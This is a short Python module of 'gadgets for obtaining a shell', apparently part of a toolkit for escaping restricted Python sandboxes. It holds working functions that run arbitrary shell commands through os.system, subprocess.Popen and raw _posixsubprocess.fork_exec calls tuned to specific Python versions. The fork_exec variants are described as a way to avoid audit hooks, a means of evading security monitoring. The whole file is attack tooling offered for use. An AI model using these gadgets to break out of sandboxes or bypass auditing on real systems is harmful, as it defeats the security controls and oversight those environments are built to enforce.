"""
Gadgets for obtaining a shell.
"""


#basic get shell
def get_shell__os_system(cmd, *, os):
    os.system(cmd)

def get_shell__subprocess(cmd, *, subprocess):
    subprocess.Popen(cmd, shell=True)


#useful for audit hook jails since this is not audited
def get_shell__fork_exec_3_10(cmd, *, import_builtin_module):
    """
        platforms: ["linux"]
        versions: [9, 10, 11]
    """
    #required for the child process to even execute correctly, otherwise its a silent death since the pipes cannot be established
    errread, errwrite = import_builtin_module('os').pipe()
    import_builtin_module('_posixsubprocess').fork_exec(['/bin/sh', '-c', cmd], (b'/bin/sh',), True, (errwrite,), None, None, -1, -1, -1, -1, -1, -1, errread, errwrite, True, False, None, None, None, -1, lambda: None)
    

def get_shell__fork_exec_3_12(cmd, *, import_builtin_module):
    """
        platforms: ["linux"]
        versions: [12]
    """
    errread, errwrite = import_builtin_module('os').pipe()
    import_builtin_module('_posixsubprocess').fork_exec(['/bin/sh', '-c', cmd], (b'/bin/sh',), True, (errwrite,), None, None, -1, -1, -1, -1, -1, -1, errread, errwrite, True, False, 0, None, None, None, -1, lambda: None, False)    
